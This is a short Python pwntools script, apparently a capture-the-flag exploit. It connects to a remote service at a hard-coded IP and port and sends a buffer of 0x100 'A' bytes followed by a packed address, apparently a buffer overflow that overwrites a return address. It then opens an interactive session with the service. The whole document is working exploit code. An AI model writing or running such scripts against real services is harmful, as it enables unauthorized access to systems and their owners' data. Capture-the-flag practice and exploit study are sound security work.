from pwn import *

context.log_level = 'debug'

p = remote('52.195.11.111', 6666)
p.recvuntil('> ')

p.sendline('A'*0x100 + p64(0x400104))
p.sendline('0')

p.interactive()
